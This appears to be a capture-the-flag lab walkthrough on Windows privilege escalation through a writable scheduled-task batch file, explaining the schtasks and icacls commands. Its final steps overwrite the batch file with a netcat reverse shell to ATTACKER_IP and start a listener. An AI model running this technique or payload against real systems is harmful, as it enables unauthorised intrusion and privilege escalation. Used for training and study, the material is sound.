Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
 
 Breakdown of the Command:
- **`schtasks`**:
    - This is the primary command used to create, delete, configure, or display scheduled tasks on a local or remote machine.
- **`/query`**:
    - This option tells `schtasks` to display or query information about tasks. When used without any additional parameters, it shows a list of all scheduled tasks.
- **`/tn vulntask`**:
    - **`/tn`** stands for "task name."
    - **`vulntask`** is the specific name of the task you want to query. This parameter restricts the output to details about the task named `vulntask`.
- **`/fo list`**:
    - **`/fo`** stands for "format."
    - **`list`** specifies the format of the output. The available formats are:
        - `TABLE`: Displays the output in a table format.
        - `LIST`: Displays the output in a list format, with each property on a separate line (this is the format chosen in your command).
        - `CSV`: Displays the output in a comma-separated values format, which is useful for exporting the data.
- **`/v`**:
    - **`/v`** stands for "verbose."
    - This option provides detailed information about the task, including settings, triggers, actions, conditions, and more.

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Breakdown of the Command:
- **`icacls`**:
    - This is the command-line utility in Windows used to display or modify the access control lists (ACLs) for files and directories. ACLs define the permissions that users and groups have for accessing or modifying the file or directory.
- **`c:\tasks\schtask.bat`**:
    - This is the file path to the specific file or directory you want to query or modify. In this case, it's targeting a batch file named `schtask.bat` located in the `C:\tasks\` directory.

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

 Explanation of the Command in the Batch File:
- If `schtask.bat` is executed, it will attempt to run `nc64.exe` (Netcat) from the `c:\tools\` directory.
- The `-e cmd.exe` part tells Netcat to launch a command shell (`cmd.exe`) when a connection is made.
- The `ATTACKER_IP 4444` part tells Netcat to connect to the specified IP address (`ATTACKER_IP`) on port `4444`.

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
```shell-session
nc -lvp 4444
